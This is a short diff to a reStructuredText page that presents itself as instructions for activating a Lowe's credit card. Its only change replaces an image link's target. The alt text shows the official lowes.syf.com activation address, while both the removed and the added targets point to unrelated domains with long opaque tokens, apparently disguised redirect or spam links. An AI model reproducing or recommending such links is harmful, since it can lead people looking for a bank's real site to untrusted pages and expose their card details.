@@ -8,7 +8,7 @@ Activate your Lowe’s credit card online quickly at lowes.syf.com. Follow our s
 
 .. image:: activatenow.png
    :alt: lowes.syf.com/activate
-   :target: https://6us.org/?3X7UunD01l83Vhliqgo29OTgMcrtmpnHyZBdChEVSj6j7n0kaKYzt666dxKM4xbMy12ua
+   :target: https://us00.net/?CqqyiIcugtWltub87eSvAJeFZC5JHNwZMYVvdUiInxekKcdsEPGttrMFy34VFzzzFF
 
 ========================================
 Step-by-Step Instructions - 
